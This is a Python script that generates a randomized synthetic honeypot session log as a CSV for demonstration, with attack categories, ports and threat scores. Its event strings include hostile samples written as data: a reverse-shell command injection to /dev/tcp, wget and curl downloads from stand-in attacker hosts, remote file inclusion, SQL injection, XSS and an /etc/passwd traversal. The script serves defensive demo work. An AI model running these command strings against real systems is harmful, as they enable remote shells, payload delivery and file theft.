# generate_mixed_demo.py (v2)
# Dynamically generates a new, randomized honeypot_sessions.csv every run

import csv
import random
import time
from datetime import datetime, timedelta
from pathlib import Path
import uuid

OUT = Path("output/honeypot_sessions.csv")
OUT.parent.mkdir(parents=True, exist_ok=True)

attack_types = {
    "bruteforce": {
        "ports": [22, 2222, 21, 23],
        "events": [
            "Failed password for user 'root' via SSH",
            "Authentication failure: invalid user admin",
            "Multiple login attempts from same IP",
            "Password spray detected against SSH"
        ],
    },
    "recon": {
        "ports": [80, 443, 8080, 3306, 23],
        "events": [
            "Nmap scan detected",
            "Masscan port sweep",
            "Banner grab on port",
            "Service fingerprinting attempt"
        ],
    },
    "exploit": {
        "ports": [80, 8080, 8000, 4444],
        "events": [
            "Command injection: ; /bin/sh -i >& /dev/tcp/8.8.8.8/4444 0>&1",
            "SQL injection attempt: UNION SELECT password FROM users",
            "Exploit payload execution attempt",
            "Remote file inclusion: http://malicious.site/x.php"
        ],
    },
    "malware": {
        "ports": [80, 443, 22, 445],
        "events": [
            "wget http://malicious.example/payload.bin",
            "curl -O http://attacker.net/dropper.sh",
            "Malware file transfer attempt",
            "Outbound connection to known C2"
        ],
    },
    "xss": {
        "ports": [80, 8080],
        "events": [
            "XSS payload: <script>alert(1)</script>",
            "Reflected XSS in search parameter",
            "Stored XSS attempt on /comments",
        ],
    },
    "lfi": {
        "ports": [80, 8080],
        "events": [
            "LFI attempt: ../../../../etc/passwd",
            "File include: /index.php?page=/etc/passwd",
        ],
    },
    "portscan": {
        "ports": [0],
        "events": [
            "SYN scan across ports 1-1024",
            "TCP connect scan detected",
            "ICMP echo sweep detected",
        ],
    },
    "ddos": {
        "ports": [80, 443],
        "events": [
            "Abnormally high traffic volume from single IP",
            "Multiple simultaneous connections detected",
            "HTTP flood pattern observed",
        ],
    },
}

def rand_public_ip():
    # Generate random public IPs excluding private ranges
    first = random.choice([5, 49, 177, 1, 203, 8, 200, 95, 83, 65, 178, 185, 37, 91])
    return f"{first}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"

def make_session(now):
    atype = random.choice(list(attack_types.keys()))
    info = attack_types[atype]
    dst_port = random.choice(info["ports"]) if info["ports"][0] != 0 else random.randint(1, 65535)
    src_ip = rand_public_ip()
    src_port = random.randint(1024, 65000)
    events = random.choice(info["events"])
    ts = now - timedelta(minutes=random.randint(1, 60*24*7))
    end = ts + timedelta(seconds=random.randint(10, 600))
    session_id = "S-" + str(uuid.uuid4().int)[:10]
    instance = f"honeypot_{random.randint(1,5)}"
    payload_hash = uuid.uuid4().hex if atype in ("exploit","malware") else ""
    threat_score = {
        "bruteforce": random.randint(50,70),
        "recon": random.randint(20,40),
        "exploit": random.randint(80,95),
        "malware": random.randint(85,99),
        "xss": random.randint(40,60),
        "lfi": random.randint(55,75),
        "portscan": random.randint(25,45),
        "ddos": random.randint(90,100),
    }[atype]

    return {
        "session_id": session_id,
        "src_ip": src_ip,
        "src_port": src_port,
        "events": events,
        "end_time": end.strftime("%Y-%m-%dT%H:%M:%S"),
        "timestamp": ts.strftime("%Y-%m-%dT%H:%M:%S"),
        "instance": instance,
        "src_country": "",
        "dst_port": dst_port,
        "attack_type": atype,
        "threat_score": threat_score,
        "payload_hash": payload_hash,
    }

def generate(n=200):
    now = datetime.utcnow()
    rows = [make_session(now) for _ in range(n)]
    random.shuffle(rows)
    header = list(rows[0].keys())
    with OUT.open("w", newline="", encoding="utf-8") as fh:
        w = csv.DictWriter(fh, fieldnames=header)
        w.writeheader()
        w.writerows(rows)
    print(f"✅ Wrote {OUT} with {len(rows)} unique sessions.")
    mix = {}
    for r in rows:
        mix[r['attack_type']] = mix.get(r['attack_type'], 0) + 1
    print(f"Attack mix: {mix}")

if __name__ == "__main__":
    random.seed(time.time())  # ensures every run is different
    generate(200)
